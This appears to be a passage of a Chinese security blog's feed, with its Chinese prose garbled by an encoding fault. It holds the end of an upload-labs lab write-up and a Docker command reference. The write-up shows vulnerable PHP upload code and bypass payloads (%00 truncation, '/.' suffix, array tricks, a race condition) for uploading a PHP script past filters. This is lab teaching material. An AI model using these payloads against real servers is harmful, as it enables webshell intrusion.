    $ret = $this-&gt;move();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this-&gt;cls_rename_file == 1 ){
      $ret = $this-&gt;renameFile();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
  
  }
......
......
...... 
};
</code></pre>
<blockquote>
<p>æœ¬é¢˜éœ€è¦Apache+PHPçš„ç¯å¢ƒ,Nginx+PHPæ— æ³•å¤ç°</p>
</blockquote>
<h3 id="æ¡ä»¶ç«äº‰æ¼æ´-2">æ¡ä»¶ç«äº‰æ¼æ´</h3>
<p>æœ¬é¢˜ä¾ç„¶æ˜¯æ–‡ä»¶ä¸Šä¼ å…ˆä¸´æ—¶ä¿å­˜,ç„¶ååœ¨ä¿®æ”¹æ–‡ä»¶å,åªè¦æ–‡ä»¶ä¸Šä¼ å¤Ÿå¿«,phpé‡å‘½åå°±ä¼šæ¥ä¸åŠ,æ‰€ä»¥å­˜åœ¨æ¡ä»¶ç«äº‰,ä¸”éœ€è¦ç»“åˆApacheæœªçŸ¥åç¼€è§£ææ¼æ´</p>
<h3 id="å¤ç°æ¼æ´-2">å¤ç°æ¼æ´</h3>
<p>ä¾æ—§ä½¿ç”¨Pass-18çš„payload.phpçš„ä»£ç ,å¹¶é‡å‘½åä¸ºphp_payload.php.7z</p>
<p>Pythonè„šæœ¬ä¹Ÿæ˜¯ç”¨Pass-18çš„,ä¸”è¯·æ±‚çš„Urlé‡Œçš„æ–‡ä»¶åæ”¹ä¸ºphp_payload.php.7z</p>
<p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒé—®é¢˜,æˆ‘æµ‹è¯•çš„æ—¶å€™æ–‡ä»¶ä¸Šä¼ çš„Urlä¸º:</p>
<p><code>http://192.168.78.101/upload/uploadphp_payload.php.7z</code>uploadå’Œphp_payload.php.7zä¹‹é—´å°‘äº†æ¡åæ–œæ ,æ‰€ä»¥pythonçš„è¯·æ±‚çš„Urlä¸º:</p>
<p><code>http://192.168.78.101/upload/upload/php_payload.php.7z</code></p>
<p><code>å¤§å®¶æ ¹æ®è‡ªå·±ç¯å¢ƒè¿›è¡Œä¿®æ”¹</code></p>
<br>
<h2 id="pass-20">Pass-20</h2>
<blockquote>
<p>æœ¬passçš„å–æ–‡ä»¶åé€šè¿‡$_POSTæ¥è·å–ã€‚</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        }else{
            $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼';
        }

    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="00æˆªæ–­ä¸ç»•è¿‡">00æˆªæ–­ä¸/.ç»•è¿‡</h3>
<p>ç”±äºæ–‡ä»¶ä¸Šä¼ å,é€šè¿‡POSTå°†æ–‡ä»¶åä¼ é€’,æ‰€ä»¥å¯ä»¥åœ¨move_uploaded_fileæ¥ç»•è¿‡é»‘åå•</p>
<pre><code class="language-powershell">payload1:
	upload-19.jpg -&gt; upload-19.php%00
	ç”±äºæ˜¯POSTæ‰€ä»¥éœ€è¦åƒPass-13ä¸€æ ·éœ€è¦æ‰‹åŠ¨è¿›è¡Œurldecode
payload2:
	upload-19.jpg -&gt; upload-19/.
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%851.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%852.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-21">Pass-21</h2>
<blockquote>
<p>Pass-20æ¥æºäºCTFï¼Œè¯·å®¡è®¡ä»£ç ï¼(ğŸ˜…éƒ½æ›´æ–°21é¢˜äº†,æç¤ºè¿˜ä¸æ”¹ğŸ˜…)</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //æ£€æŸ¥MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;;
    }else{
        //æ£€æŸ¥æ–‡ä»¶å
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;;
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;;
                $is_upload = true;
            } else {
                $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;;
            }
        }
    }
}else{
    $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;
}
</code></pre>
<h3 id="æ•°ç»„ç»•è¿‡">æ•°ç»„/ç»•è¿‡</h3>
<p><code>$file_name</code>ç»è¿‡<code>reset($file) . '.' . $file[count($file) - 1];</code>å¤„ç†ã€‚</p>
<p>å¦‚æœä¸Šä¼ çš„æ˜¯æ•°ç»„çš„è¯ï¼Œä¼šè·³è¿‡<code>$file = explode('.', strtolower($file));</code>ã€‚å¹¶ä¸”åç¼€æœ‰ç™½åå•è¿‡æ»¤,è€Œæœ€ç»ˆçš„æ–‡ä»¶ååç¼€å–çš„æ˜¯<code>$file[count($file) - 1]</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©<code>$file</code>ä¸ºæ•°ç»„ã€‚<code>$file[0]</code>ä¸º<code>upload-29.php/</code>ï¼Œä¹Ÿå°±æ˜¯<code>reset($file)</code>ï¼Œç„¶åå†ä»¤<code>$file[2]</code>ä¸ºç™½åå•ä¸­çš„jpgã€‚æ­¤æ—¶<code>end($file)</code>ç­‰äºjpgï¼Œ<code>$file[count($file) - 1]</code>ä¸ºç©ºã€‚è€Œ <code>$file_name = reset($file) . '.' . $file[count($file) - 1];</code>ï¼Œä¹Ÿå°±æ˜¯<code>upload-29.php/.</code>ï¼Œæœ€ç»ˆ<code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰<code>/.</code>ï¼Œæœ€ç»ˆä¸Šä¼ <code>upload-29.php</code>ã€‚</p>
<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-21burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<br>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†ææµç¨‹">æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†ææµç¨‹</h2>
<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dockerä¿å§†çº§æ•™ç¨‹ : Docker å‘½ä»¤æ‰‹å†Œ]]></title>
        <id>https://M0kY4n.github.io/Websec/post/docker-ming-ling-shou-ce/</id>
        <link href="https://M0kY4n.github.io/Websec/post/docker-ming-ling-shou-ce/">
        </link>
        <updated>2020-07-17T03:12:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dockerå‘½ä»¤ç¬”è®°">Dockerå‘½ä»¤ç¬”è®°</h1>
<br>
<h2 id="docker-å­¦ä¹ èµ„æº">Docker å­¦ä¹ èµ„æº</h2>
<blockquote>
<p>Dockerå®˜æ–¹å‘½ä»¤æ‰‹å†Œ :https://docs.docker.com/reference/</p>
<p>èœé¸Ÿæ•™ç¨‹å‘½ä»¤æ‰‹å†Œ:https://www.runoob.com/docker/docker-command-manual.html</p>
<p>Bç«™<a href="https://space.bilibili.com/95256449">é‡è§ç‹‚ç¥è¯´</a>UPä¸»è§†é¢‘æ•™å­¦:https://www.bilibili.com/video/BV1og4y1q7M4</p>
</blockquote>
<br>
<br>
<h2 id="dockeré•œåƒå‘½ä»¤">Dockeré•œåƒå‘½ä»¤</h2>
<br>
<h3 id="docker-imagesæŸ¥çœ‹æœ¬åœ°é•œåƒ">docker images	æŸ¥çœ‹æœ¬åœ°é•œåƒ</h3>
<pre><code class="language-shell">docker images [OPTIONS] [REPOSITORY[:TAG]]
-a	åˆ—å‡ºæœ¬åœ°æ‰€æœ‰é•œåƒ
-q	åˆ—å‡ºæœ¬åœ°æ‰€æœ‰é•œåƒä¸”åªæ˜¾ç¤ºIMAGE ID

docker images -a

REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              bf756fb1ae65        5 months ago        13.3kB

docker images -a
bf756fb1ae65

docker images hello-world
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello-world         latest              bf756fb1ae65        5 months ago        13.3kB

#å‚æ•°è¯´æ˜
REPOSITORY			é•œåƒçš„åå­—
TAG					é•œåƒçš„æ ‡ç­¾
IMAGE ID			é•œåƒçš„IDå€¼
CREATED				é•œåƒçš„åˆ›å»ºæ—¶é—´
SIZE				é•œåƒçš„å¤§å°

</code></pre>
<br>
<h3 id="docker-searchä»docker-hubæŸ¥æ‰¾é•œåƒ">docker search	ä»Docker HubæŸ¥æ‰¾é•œåƒ</h3>
<blockquote>
<p>Docker Hubåœ°å€:https://hub.docker.com/</p>
</blockquote>
<p>ä»Docker Hubä¸­æœç´¢mysqlçš„ç»“æœ</p>
<figure data-type="image" tabindex="1"><img src="https://file.moetu.org/images/2020/07/17/image-2020062415532498204635e27e999eaab.png" alt="image-2020062415532498204635e27e999eaab.png" loading="lazy"></figure>
<p>é€šè¿‡docker searchæœç´¢mysqlçš„ç»“æœ</p>
<pre><code class="language-shell">
docker search mysql

NAME         		DESCRIPTION            			STARS       OFFICIAL        AUTOMATED
mysql        		MySQL is a widely used...   	9666        [OK]                
mariadb      		MariaDB is a community-devel.. 	3517      	[OK]                
mysql/mysql-server  Optimized MySQL Server Docker.. 705                         [OK]
centos/mysql-57-... MySQL 5.7 SQL database server   77                                      

#é€šè¿‡--filterç­›é€‰ç»“æœ
docker search mysql --filter=STARS=3000
NAME         		DESCRIPTION            			STARS       OFFICIAL        AUTOMATED
mysql        		MySQL is a widely used...   	9666        [OK]                
mariadb      		MariaDB is a community-devel.. 	3517      	[OK]                

#å‚æ•°è¯´æ˜
NAME				é•œåƒçš„åå­—
DESCRIPTION			é•œåƒçš„æè¿°
STARS				ç±»ä¼¼äºGitHubé‡Œé¢çš„star,è¡¨ç¤ºç‚¹èµ,å–œæ¬¢
OFFICIAL			æ˜¯å¦ä¸ºdockerå®˜æ–¹å‘å¸ƒ
AUTOMATED			æ˜¯å¦è‡ªåŠ¨æ­å»º

</code></pre>
<br>
<h3 id="docker-pull-ä»docker-hubä¸‹è½½é•œåƒ">docker pull ä»Docker Hubä¸‹è½½é•œåƒ</h3>
<pre><code class="language-shell">docker pull [OPTIONS] NAME[:TAG|@DIGEST]
-a	æ‹‰å–æ‰€æœ‰åŒ…å«[NAME]çš„é•œåƒ

#é»˜è®¤ä¸‹è½½æœ€æ–°ç‰ˆ
docker pull mysql

Using default tag: latest
latest: Pulling from library/mysql
8559a31e96f4: Pull complete 
d51ce1c2e575: Pull complete 
c2344adc4858: Pull complete 
fcf3ceff18fc: Pull complete 
16da0c38dc5b: Pull complete 
b905d1797e97: Pull complete 
4b50d1c6b05c: Pull complete 
c75914a65ca2: Pull complete 
1ae8042bdd09: Pull complete 
453ac13c00a3: Pull complete 
9e680cd72f08: Pull complete 
a6b5dc864b6c: Pull complete 
Digest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6
Status: Downloaded newer image for mysql:latest
docker.io/library/mysql:latest

#æŒ‡å®šç‰ˆæœ¬ä¸‹è½½,ç‰ˆæœ¬å¿…é¡»åœ¨Docker Hubå­˜åœ¨
docker pull mysql:8.0
8.0: Pulling from library/mysql
Digest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6
Status: Downloaded newer image for mysql:8.0
docker.io/library/mysql:8.0

#ä»é•œåƒåº“æ‹‰å–æ‰€æœ‰tagæ ‡ç­¾åçš„é•œåƒ
docker pull mysql -a
#ç»“æœå¤ªå¤šäº†,ç›´æ¥çœ‹æœ¬åœ°é•œåƒ
docker images

REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
mysql               8.0                 be0dbf01a0f3        2 weeks ago         541MB
mysql               latest              be0dbf01a0f3        2 weeks ago         541MB
mysql               5.5                 d404d78aa797        13 months ago       205MB
mysql               5.5.62              d404d78aa797        13 months ago       205MB
mysql               5.6.43              bc788a6a2745        15 months ago       256MB
mysql               5.6.42              27e29668a08a        18 months ago       256MB
mysql               5.5.61              d306c8812ec3        20 months ago       205MB
mysql               5.6.41              085b9b6ec8a9        20 months ago       256MB
mysql               5.5.60              2cd7ceff3e53        23 months ago       205MB
mysql               5.6.40              50328380b2b4        23 months ago       256MB
mysql               5.5.59              0da48351c371        2 years ago         205MB
mysql               5.6.39              079344ce5ebd        2 years ago         256MB
...

</code></pre>
<br>
<h3 id="docker-rmiåˆ é™¤æœ¬åœ°é•œåƒ">docker rmi	åˆ é™¤æœ¬åœ°é•œåƒ</h3>
<pre><code class="language-shell">docker rmi [OPTIONS] IMAGE [IMAGE...]
-f	å¼ºåˆ¶åˆ é™¤

docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
mysql               latest              be0dbf01a0f3        2 weeks ago         541MB
hello-world         latest              bf756fb1ae65        5 months ago        13.3kB

#å¸è½½æœ¬åœ°é•œåƒçš„mysql
docker rmi -f be0dbf01a0f3
docker rmi -f mysql

#å¸è½½æœ¬åœ°æ‰€æœ‰é•œåƒ(ä¸€ä¸ªä¸€ä¸ªåˆ é™¤)
docker rmi -f mysql hello-world
docker rmi -f be0dbf01a0f3 bf756fb1ae65

#å¸è½½æœ¬åœ°æ‰€æœ‰é•œåƒ(é€šè¿‡$()ä¼ å€¼åˆ é™¤)
docker rmi -f $(docker images -aq)

</code></pre>
<br>
<h2 id="dockerå®¹å™¨å‘½ä»¤">Dockerå®¹å™¨å‘½ä»¤</h2>
<br>
<br>
<h3 id="docker-runæ–°å»ºå®¹å™¨å¹¶å¯åŠ¨">docker run	æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨</h3>
<pre><code class="language-shell">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]
--name=&quot;Name&quot;	ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°
-d				åå°è¿è¡Œå®¹å™¨,å¹¶è¿”å›å®¹å™¨id
--it			ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨,ä¸ºå®¹å™¨åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯
-p				(å°å†™p)æŒ‡å®šå®¹å™¨çš„ç«¯å£	æ ¼å¼ä¸º -p 8080(å®¿ä¸»æœºç«¯å£):8080(å®¹å™¨ç«¯å£)
-P				(å¤§å†™p)éšæœºæŒ‡å®šç«¯å£
-v				æŒ‚è½½ç›®å½•				æ ¼å¼ä¸º -v /home/user(å®¿ä¸»æœºç›®å½•):/root/user(å®¹å™¨ç›®å½•)
							
							åŒ¿åæŒ‚è½½ -v	å®¹å™¨å†…è·¯å¾„			  	 
							å…·åæŒ‚è½½ -v	å·å:å®¹å™¨å†…è·¯å¾„			
							æŒ‡å®šè·¯å¾„æŒ‚è½½ -v	å®¿ä¸»æœºè·¯å¾„:å®¹å™¨å†…è·¯å¾„
							
							åªè¯»	åœ¨å®¹å™¨å†…è·¯å¾„åé¢åŠ  &quot;:ro&quot;
							è¯»å†™  åœ¨å®¹å™¨å†…è·¯å¾„åé¢åŠ  &quot;:rw&quot;
-e				ç¯å¢ƒé…ç½®
--volumes-from	ä»å¦ä¸€ä¸ªå®¹å™¨å½“ä¸­æŒ‚è½½å®¹å™¨ä¸­å·²ç»åˆ›å»ºå¥½çš„æ•°æ®å·
							docker run -it --name docker02 --volumes-from docker01 centos
							è¿è¡Œå®¹å™¨docker02æŒ‚è½½åˆ°å®¹å™¨docker01ä¸Š,å®ç°æ›´æ–°æ•°æ®åœ¨å®¹å™¨ä¹‹é—´å…±äº«

#dockerå®¹å™¨ä½¿ç”¨åå°è¿è¡Œ,å°±å¿…é¡»è¦æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹,å¦åˆ™dockerå‘ç°æ²¡æœ‰åº”ç”¨å°±ä¼šåœæ­¢å®¹å™¨
</code></pre>
<br>
<h3 id="docker-psåˆ—å‡ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¿¡æ¯">docker ps	åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¿¡æ¯</h3>
<pre><code class="language-shell">docker ps [OPTIONS]
-a		æ˜¾ç¤ºæ‰€æœ‰å®¹å™¨,åŒ…æ‹¬å†å²å®¹å™¨
-n=Num	æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„&quot;n&quot;ä¸ªå®¹å™¨
-q		æ˜¾ç¤ºå®¹å™¨çš„ID

</code></pre>
<br>
<h3 id="dockeré€€å‡ºå®¹å™¨">dockeré€€å‡ºå®¹å™¨</h3>
<pre><code class="language-shell">exit			#ç»ˆæ­¢å¹¶é€€å‡ºå®¹å™¨
Ctrl + P + Q	#ä¸ç»ˆæ­¢å¹¶é€€å‡ºå®¹å™¨

</code></pre>
<br>
<h3 id="docker-rmåˆ é™¤å®¹å™¨">docker rm	åˆ é™¤å®¹å™¨</h3>
<pre><code class="language-shell">docker rm [OPTIONS] CONTAINER [CONTAINER...]
-f		#å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨

#åˆ é™¤å®¹å™¨
docker rm -f 8c7fefd9e698

#åˆ é™¤æ‰€æœ‰å®¹å™¨
docker rm -f $(docker ps -aq)
docker ps -a -q | xargs docker rm -f

</code></pre>
<br>
<h3 id="docker-startstoprestartkillå¯åŠ¨åœæ­¢é‡å¯æ€æ‰å®¹å™¨">docker start/stop/restart/kill		å¯åŠ¨/åœæ­¢/é‡å¯/æ€æ‰å®¹å™¨</h3>
<pre><code class="language-shell">docker start CONTAINER		:å¯åŠ¨å®¹å™¨
docker stop CONTAINER		:åœæ­¢å®¹å™¨
docker restart CONTAINER	:é‡å¯å®¹å™¨
docker kill CONTAINER		:æ€æ‰å®¹å™¨

</code></pre>
<br>
<h3 id="docker-logsè·å–å®¹å™¨çš„æ—¥å¿—">docker logs		è·å–å®¹å™¨çš„æ—¥å¿—</h3>
<pre><code class="language-sh">docker logs [OPTIONS] CONTAINER
-f			è·Ÿè¸ªæ—¥å¿—è¾“å‡º
-t			æ˜¾ç¤ºæ—¶é—´æˆ³
--tail Num	åˆ—å‡ºæœ€æ–°Numè°ƒå®¹å™¨æ—¥å¿—
</code></pre>
<br>
<h3 id="docker-topæŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯">Docker top		æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯</h3>
<pre><code class="language-shell">docker top [OPTIONS] CONTAINER [ps OPTIONS]
</code></pre>
<br>
<h3 id="docker-inspectè·å–å®¹å™¨é•œåƒçš„å…ƒæ•°æ®">docker inspect		è·å–å®¹å™¨/é•œåƒçš„å…ƒæ•°æ®</h3>
<pre><code class="language-shell">docker inspect [OPTIONS] NAME|ID [NAME|ID...]

#æŸ¥çœ‹centosçš„å…ƒæ•°æ®
docker inspect centos
[
    {
        &quot;Id&quot;: &quot;sha256:831691599b88ad6cc2a4abbd0e89661a121aff14cfa289ad840fd3946f274f1f&quot;,
        &quot;RepoTags&quot;: [
            &quot;centos:latest&quot;
        ],
        &quot;RepoDigests&quot;: [
            &quot;centos@sha256:4062bbdd1bb0801b0aa38e0f83dece70fb7a5e9bce223423a68de2d8b784b43b&quot;
        ],
...
</code></pre>
<br>
<h3 id="docker-execè¿›å…¥å·²ç»è¿è¡Œçš„å®¹å™¨é‡æ–°åˆ†é…ç»ˆç«¯">Docker exec		è¿›å…¥å·²ç»è¿è¡Œçš„å®¹å™¨(é‡æ–°åˆ†é…ç»ˆç«¯)</h3>
<pre><code class="language-shell">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
--it			ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨,ä¸ºå®¹å™¨åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯

#è¿›å…¥æ­£åœ¨è¿è¡Œçš„Centoså®¹å™¨
docker exec -it 336cc1fb92bf /bin/bash


</code></pre>
<br>
<h3 id="docker-attachè¿æ¥åˆ°æ­£åœ¨è¿è¡Œä¸­çš„å®¹å™¨">Docker attach		è¿æ¥åˆ°æ­£åœ¨è¿è¡Œä¸­çš„å®¹å™¨</h3>
<pre><code class="language-shell">docker attach [OPTIONS] CONTAINER

#è¿›å…¥æ­£åœ¨è¿è¡Œçš„Centoså®¹å™¨
docker attach 336cc1fb92bf
</code></pre>
<br>
<h3 id="docker-cp-å®¹å™¨ä¸ä¸»æœºä¹‹é—´æ•°æ®æ‹·è´">Docker cp 		å®¹å™¨ä¸ä¸»æœºä¹‹é—´æ•°æ®æ‹·è´</h3>
<pre><code class="language-shell">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-


docker cp 336cc1fb92bf:/home/test.txt /
å°†å®¹å™¨é‡Œçš„/home/test.txt æ‹·è´åˆ° å®¿ä¸»æœºçš„/ç›®å½•ä¸Š
</code></pre>
<br>
<h3 id="docker-commitä»å®¹å™¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ">Docker commit		ä»å®¹å™¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ</h3>
<pre><code class="language-shell">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]
-m :æäº¤æ—¶çš„è¯´æ˜æ–‡å­—ï¼›
-a :æäº¤çš„é•œåƒä½œè€…ï¼›

åˆ›å»ºä¸€ä¸ªé•œåƒ
docker commit -a=&quot;MokYan&quot; -m=&quot;add webapps app&quot; c97729657a71 tomcat-v1:1.0

docker images

REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
tomcat-v1             1.0              	  366d86150b16        19 seconds ago      652MB
tomcat                latest              6055d4d564e1        3 days ago          647MB

</code></pre>
<br>
<h2 id="docker-æ•°æ®å‘½ä»¤">Docker æ•°æ®å‘½ä»¤</h2>
<br>
<br>
<h3 id="docker-volumeç®¡ç†dockerå®¹å™¨æŒ‚è½½çš„å·">docker volume		ç®¡ç†dockerå®¹å™¨æŒ‚è½½çš„å·</h3>
<pre><code class="language-shell">Usage:	docker volume COMMAND

Commands:
  create      åˆ›å»ºä¸€ä¸ª volume
  inspect     æŸ¥çœ‹ä¸€ä¸ªæˆ–å¤šä¸ªvolume çš„å…ƒæ•°æ®
  ls          æŸ¥çœ‹ volumes
  prune       åˆ é™¤æ‰€æœ‰æœªä½¿ç”¨çš„æœ¬åœ° volumes
  rm          ç§»å‡ºä¸€ä¸ªæˆ–å¤šä¸ª volumes
  

</code></pre>
<ul>
<li>docker é»˜è®¤åœ¨ä¸»æœºä¸Šä¼šæœ‰ä¸€ä¸ªç‰¹å®šçš„åŒºåŸŸï¼ˆ<code>/var/lib/docker/volumes/</code>ï¼‰ï¼Œè¯¥åŒºåŸŸç”¨æ¥å­˜æ”¾ volumeã€‚</li>
<li>é docker è¿›ç¨‹ä¸åº”è¯¥å»ä¿®æ”¹è¯¥åŒºåŸŸã€‚</li>
<li>volume å¯ä»¥é€šè¿‡ <code>docker volume</code> è¿›è¡Œç®¡ç†ï¼Œå¦‚åˆ›å»ºã€åˆ é™¤ç­‰æ“ä½œã€‚</li>
<li>volume åœ¨ç”Ÿæˆçš„æ—¶å€™å¦‚æœä¸æŒ‡å®šåç§°ï¼Œä¾¿ä¼šéšæœºç”Ÿæˆã€‚</li>
</ul>
<br>
<h3 id="docker-file">docker file</h3>
<pre><code class="language-shell">ä½¿ç”¨ Dockerfile å®šåˆ¶é•œåƒ

1.	åˆ›å»ºDocker fileæ–‡ä»¶(åå­—éšæ„)
	vim dockerfile1
	
2.	ç¼–è¾‘docker fileæ–‡ä»¶
	FROM centos
	VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]
	CMD echo &quot;----end----&quot;
	CMD /bin/bash

3.	æ„å»ºé•œåƒ
	docker build -f /home/docker-test-volume/dockerfile1 -t mokyan/centos:1.0 .
	Sending build context to Docker daemon  2.048kB
    Step 1/4 : FROM centos
     ---&gt; 831691599b88
    Step 2/4 : VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]
     ---&gt; Running in 7aa721724f47
    Removing intermediate container 7aa721724f47
     ---&gt; 37cc8ddeb5ef
    Step 3/4 : CMD echo &quot;----end----&quot;
     ---&gt; Running in a00fd1594c00
    Removing intermediate container a00fd1594c00
     ---&gt; 976fefd5e341
    Step 4/4 : CMD /bin/bash
     ---&gt; Running in 3203befb485f
    Removing intermediate container 3203befb485f
     ---&gt; e03ef3a4bf68
    Successfully built e03ef3a4bf68
    Successfully tagged mokyan/centos:1.0
    
4.	æŸ¥çœ‹é•œåƒ
	docker images
	REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
	mokyan/centos         1.0                 e03ef3a4bf68        16 seconds ago      215MB

æ³¨æ„:
	ç¼–è¾‘docker fileæ–‡ä»¶,é‡Œé¢çš„å‘½ä»¤éƒ½æ˜¯å¤§å†™çš„
	æ„å»ºé•œåƒæ—¶,æœ€åçš„ç‚¹æ˜¯ä¸Šä¸‹æ–‡è·¯å¾„,æ‰€ä»¥ä¸Šä¸‹æ–‡è·¯å¾„ä¸‹ä¸è¦æ”¾æ— ç”¨çš„æ–‡ä»¶ï¼Œå› ä¸ºä¼šä¸€èµ·æ‰“åŒ…å‘é€ç»™ docker å¼•æ“ï¼Œå¦‚æœæ–‡ä»¶è¿‡å¤šä¼šé€ æˆè¿‡ç¨‹ç¼“æ…¢ã€‚
	æ„å»ºé•œåƒæ—¶,-tåé¢æ¥çš„åå­—ä¸èƒ½å­˜åœ¨å¤§å†™,å¦åˆ™ä¼šæŠ¥é”™
	æ„å»ºé•œåƒæ—¶,&quot;#&quot;è¡¨ç¤ºæ³¨é‡Š

</code></pre>
<br>
<h3 id="docker-file-æŒ‡ä»¤">docker file æŒ‡ä»¤</h3>
<pre><code class="language-shell">FROM			#åŸºç¡€é•œåƒ,åŸºäºè¿™ä¸ªé•œåƒæ„å»º
MAINTAINER		#æ„å»ºé•œåƒçš„ä½œè€…ä¿¡æ¯
RUN				#é•œåƒæ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤
ADD				#æ·»åŠ å†…å®¹
WORKDIR			#é•œåƒçš„å·¥ä½œç›®å½•
VOLUME			#æŒ‚è½½çš„ç›®å½•
EXPOSE			#æš´éœ²ç«¯å£é…ç½®
CMD				#å®¹å™¨å¯åŠ¨æ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤,åªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆ,å¯è¢«æ›¿æ¢
ENTRYPOINT		#å®¹å™¨å¯åŠ¨æ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤,å¯ä»¥è¿½åŠ å‘½ä»¤	
ENV				#æ„å»ºçš„æ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡
</code></pre>
<br>
<h2 id="docker-ç½‘ç»œå‘½ä»¤">Docker ç½‘ç»œå‘½ä»¤</h2>
<br>
<br>
<h3 id="docker-network">docker network</h3>
<pre><code class="language-shell">docker network --help

Usage:	docker network COMMAND

Manage networks

Commands:
  connect     Connect a container to a network
  create      Create a network
